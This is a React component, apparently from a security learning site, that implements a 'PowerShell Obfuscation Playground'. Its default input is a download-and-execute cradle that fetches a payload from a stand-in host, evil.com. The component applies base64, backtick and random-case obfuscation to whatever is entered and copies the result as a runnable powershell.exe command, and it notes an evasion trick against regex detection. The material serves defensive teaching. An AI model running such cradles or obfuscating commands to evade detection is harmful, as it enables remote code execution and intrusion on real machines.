"use client"

import React, { useState, useEffect } from 'react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Copy, Check, Terminal, Zap, ShieldAlert, Sparkles, Wand2 } from 'lucide-react'

export function PowerShellPlayground() {
    const [input, setInput] = useState("IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')")
    const [obfuscationType, setObfuscationType] = useState('base64')
    const [output, setOutput] = useState('')
    const [copied, setCopied] = useState(false)

    const obfuscate = (text: string, type: string) => {
        switch (type) {
            case 'base64':
                try {
                    // PowerShell uses UTF-16LE for base64 encoded commands
                    const buffer = Buffer.from(text, 'utf16le')
                    return buffer.toString('base64')
                } catch (e) {
                    return "Error encoding base64"
                }
            case 'backticks':
                return text.split('').map(char => Math.random() > 0.8 && char !== ' ' ? '`' + char : char).join('')
            case 'case':
                return text.split('').map(char => Math.random() > 0.5 ? char.toUpperCase() : char.toLowerCase()).join('')
            case 'mixed':
                let res = text.split('').map(char => Math.random() > 0.5 ? char.toUpperCase() : char.toLowerCase()).join('')
                res = res.split('').map(char => Math.random() > 0.9 && char !== ' ' ? '`' + char : char).join('')
                return res
            default:
                return text
        }
    }

    useEffect(() => {
        setOutput(obfuscate(input, obfuscationType))
    }, [input, obfuscationType])

    const copyToClipboard = async () => {
        try {
            const command = obfuscationType === 'base64'
                ? `powershell.exe -EncodedCommand ${output}`
                : `powershell.exe -Command "${output}"`
            await navigator.clipboard.writeText(command)
            setCopied(true)
            setTimeout(() => setCopied(false), 2000)
        } catch (err) {
            console.error('Failed to copy: ', err)
        }
    }

    return (
        <div className="my-8">
            <Card className="bg-gradient-to-br from-slate-900 via-slate-900 to-blue-950 border-slate-700 overflow-hidden">
                <div className="absolute top-0 right-0 p-8 opacity-5">
                    <Terminal className="h-32 w-32 text-blue-400" />
                </div>

                <CardHeader>
                    <CardTitle className="text-2xl text-white flex items-center gap-2">
                        <Zap className="h-6 w-6 text-yellow-400" />
                        PowerShell Obfuscation Playground
                    </CardTitle>
                    <CardDescription className="text-slate-300">
                        Experiment with common LOTL obfuscation techniques to understand evasion patterns.
                    </CardDescription>
                </CardHeader>

                <CardContent className="space-y-6 relative z-10">
                    <div className="space-y-2">
                        <label className="text-sm font-medium text-slate-400">Original Command</label>
                        <div className="relative">
                            <Terminal className="absolute left-3 top-3 h-4 w-4 text-slate-500" />
                            <Input
                                value={input}
                                onChange={(e) => setInput(e.target.value)}
                                className="pl-10 bg-slate-800/50 border-slate-700 text-cyan-300 font-mono text-sm focus:ring-blue-500/30 h-12"
                                placeholder="Enter PowerShell command..."
                            />
                        </div>
                    </div>

                    <div className="space-y-4">
                        <Tabs value={obfuscationType} onValueChange={setObfuscationType} className="w-full">
                            <div className="flex items-center justify-between mb-2">
                                <label className="text-sm font-medium text-slate-400">Technique</label>
                                <TabsList className="bg-slate-800/80 border-slate-700">
                                    <TabsTrigger value="base64" className="text-xs data-[state=active]:bg-blue-600">Base64</TabsTrigger>
                                    <TabsTrigger value="backticks" className="text-xs data-[state=active]:bg-purple-600">Backticks</TabsTrigger>
                                    <TabsTrigger value="case" className="text-xs data-[state=active]:bg-orange-600">Random Case</TabsTrigger>
                                    <TabsTrigger value="mixed" className="text-xs data-[state=active]:bg-red-600">Mixed</TabsTrigger>
                                </TabsList>
                            </div>

                            <div className="mt-4 p-4 bg-slate-950/80 rounded-lg border border-slate-700 relative group">
                                <div className="absolute top-2 right-2 flex gap-2">
                                    <Button
                                        size="sm"
                                        variant="ghost"
                                        className="h-8 w-8 p-0 text-slate-400 hover:text-white hover:bg-slate-800"
                                        onClick={() => setOutput(obfuscate(input, obfuscationType))}
                                        title="Regenerate"
                                    >
                                        <Wand2 className="h-4 w-4" />
                                    </Button>
                                    <Button
                                        size="sm"
                                        variant="ghost"
                                        className="h-8 w-8 p-0 text-slate-400 hover:text-white hover:bg-slate-800"
                                        onClick={copyToClipboard}
                                    >
                                        {copied ? <Check className="h-4 w-4 text-green-500" /> : <Copy className="h-4 w-4" />}
                                    </Button>
                                </div>

                                <div className="pr-12">
                                    <div className="text-[10px] uppercase tracking-widest text-slate-500 mb-2 font-bold">Obfuscated Output</div>
                                    <code className="text-sm font-mono break-all leading-relaxed block text-blue-300 min-h-[4rem]">
                                        {obfuscationType === 'base64' ? (
                                            <>
                                                <span className="text-slate-500">powershell.exe -EncodedCommand </span>
                                                {output}
                                            </>
                                        ) : (
                                            <>
                                                <span className="text-slate-500">powershell.exe -Command </span>
                                                "{output}"
                                            </>
                                        )}
                                    </code>
                                </div>
                            </div>
                        </Tabs>
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pt-2">
                        <div className="p-3 bg-blue-500/5 border border-blue-500/20 rounded-lg flex gap-3">
                            <Sparkles className="h-5 w-5 text-blue-400 flex-shrink-0 mt-0.5" />
                            <div>
                                <p className="text-xs font-bold text-blue-300 uppercase tracking-tight mb-1">Defense Tip</p>
                                <p className="text-xs text-slate-400">
                                    Script Block Logging (Event ID 4104) captures the deobfuscated payload at the moment of execution.
                                </p>
                            </div>
                        </div>
                        <div className="p-3 bg-red-500/5 border border-red-500/20 rounded-lg flex gap-3">
                            <ShieldAlert className="h-5 w-5 text-red-400 flex-shrink-0 mt-0.5" />
                            <div>
                                <p className="text-xs font-bold text-red-300 uppercase tracking-tight mb-1">Evasion Logic</p>
                                <p className="text-xs text-slate-400">
                                    Attackers shorten parameters like <code className="text-red-400">-enc</code> to bypass simple regex detections.
                                </p>
                            </div>
                        </div>
                    </div>
                </CardContent>
            </Card>
        </div>
    )
}
